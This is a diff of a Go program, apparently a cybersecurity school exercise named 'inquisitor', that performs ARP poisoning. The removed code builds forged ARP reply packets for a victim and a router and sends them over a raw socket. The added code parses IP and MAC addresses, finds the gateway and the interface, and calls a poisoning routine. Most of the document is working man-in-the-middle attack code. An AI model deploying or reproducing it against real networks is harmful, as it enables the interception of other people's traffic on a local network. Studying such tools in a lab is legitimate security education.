@@ -3,116 +3,82 @@ package main
 import (
 	"log"
 	"net"
-	"syscall"
 	"os"
 	"fmt"
-	"strings"
-	"strconv"
-)	
+	"bytes"
+	"github.com/jackpal/gateway"
+	"github.com/mostlygeek/arp"
+	"github.com/migueldar/42CyberSec_inquisitor/arpPoison"
+)
 
 //in charge of getting the arguments and turning them into byte arrays
-//need to do error hadling
-func parse() [][]byte {
+func parse() ([][]byte, error) {
 	args := os.Args
 	if (len(args) != 5) {
-		fmt.Println("Incorrect number of arguments, the structure must be: <IP-src><MAC-src><IP-target><MAC-target>, Ip format: x.x.x.x (decimal), Mac format: xx:xx:xx:xx:xx:xx (hex)")
-		os.Exit(1)
+		return nil, fmt.Errorf("Incorrect number of arguments, the structure must be: <IPv4-src><MAC-src><IPv4-target><MAC-target>")
 	}
-	bisliceS := make([][]string, 0, 4)
+	var introduce []byte
+	var err error
+	bislice := make([][]byte, 6, 6)
 	for i, v := range(args[1:]) {
 		if i % 2 == 0 {
-			bisliceS = append(bisliceS, strings.Split(v, "."))
-		} else {
-			bisliceS = append(bisliceS, strings.Split(v, ":"))
-		}
-	}
-	bisliceB := make([][]byte, 4, 4)
-	var base int
-	for i, v := range(bisliceS) {
-		if i % 2 == 0 {
-			base = 9
-		} else {
-			base = 15
-		}
-		base++
-		for _, w := range(v) {
-			introduce, err := strconv.ParseUint(w, base, 8)
-			if err != nil {
-				log.Fatal(err)
+			introduce = net.ParseIP(v)
+			if introduce == nil {
+				return nil, fmt.Errorf("Invalid IP: %s\n", v)
 			}
-			bisliceB[i] = append(bisliceB[i], byte(introduce))
+			introduce = net.IP(introduce).To4()
+		} else {
+			introduce, err = net.ParseMAC(v)
+			if err != nil {
+				return nil, err
+			}
+		}
+		bislice[i] = introduce
+	}
+	return bislice, nil
+}
+
+func addGateway(args [][]byte) {
+	gateIp, err := gateway.DiscoverGateway()
+	if err != nil {
+		log.Fatal(err)
+	}
+	gateMACStr := arp.Search(gateIp.String())
+	if gateMACStr == "" {
+		log.Fatal("Error, gateway's MAC not found in arp table")
+	}
+	gateMAC, err := net.ParseMAC(gateMACStr)
+	if err != nil {
+		log.Fatal(err)
+	}
+	args[4] = gateIp
+	args[5] = gateMAC
+}
+
+func getInterface(srcMAC []byte) (*net.Interface, error) {
+	allInterfaces, err := net.Interfaces()
+	if err != nil {
+		return nil, err
+	}
+	for _, v := range(allInterfaces) {
+		if bytes.Equal(v.HardwareAddr, srcMAC) {
+			return &v, nil
 		}
 	}
-	return bisliceB
+	return nil, fmt.Errorf("Network interface not found for given MAC-src")
 }
 
 func main() {
 	var err error
-	args := parse()
-	fmt.Println(args)
-	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
+	args, err := parse()
 	if err != nil {
 		log.Fatal(err)
 	}
-	interf, _ := net.InterfaceByName("eth0")
-	addr := syscall.SockaddrLinklayer{
-		Ifindex: interf.Index,
-	}
-	p := pkt_for_victim([]byte{172, 18, 0, 1}, args[1], args[2], args[3])
-	err = syscall.Sendto(fd, p, 0, &addr)
-	p = pkt_for_router(args[0], args[1], []byte{172, 18, 0, 1}, /*mac address of the router erased for commit*/)
-	err = syscall.Sendto(fd, p, 0, &addr)
+	addGateway(args)
+	inter, err := getInterface(args[1])
 	if err != nil {
-		log.Fatal("Sendto:", err)
+		log.Fatal(err)
 	}
-}
-
-//make it available for wifi interception too
-func pkt_for_victim(routerIp, sourceMac, targetIp, targetMac []byte) []byte {
-	base_pack := []byte {
-		0x08, //type (arp)
-		0x06,
-		0x00, //ethernet
-		0x01,
-		0x08, //IP type
-		0x00,
-		0x06, //mac len
-		0x04, //IP len
-		0x00, //operation(response)
-		0x02,
-	}
-	pack := make([]byte, 0, 42)
-	pack = append(pack, targetMac...)
-	pack = append(pack, sourceMac...)
-	pack = append(pack, base_pack...)
-	pack = append(pack, sourceMac...)
-	pack = append(pack, routerIp...)
-	pack = append(pack, targetMac...)
-	pack = append(pack, targetIp...)
-	return pack
-}
-
-//maybe before send this to router we need to send ping packet so that router has our arp address in its table
-func pkt_for_router(targetIp, sourceMac, routerIp, routerMac []byte) []byte {
-	base_pack := []byte {
-		0x08, //type (arp)
-		0x06,
-		0x00, //ethernet
-		0x01,
-		0x08, //IP type
-		0x00,
-		0x06, //mac len
-		0x04, //IP len
-		0x00, //operation(response)
-		0x02,
-	}
-	pack := make([]byte, 0, 42)
-	pack = append(pack, routerMac...)
-	pack = append(pack, sourceMac...)
-	pack = append(pack, base_pack...)
-	pack = append(pack, sourceMac...)
-	pack = append(pack, targetIp...)
-	pack = append(pack, routerMac...)
-	pack = append(pack, routerIp...)
-	return pack
+	//here goes go routine for pcap
+	arpPoison.Poison(args, inter)
 }
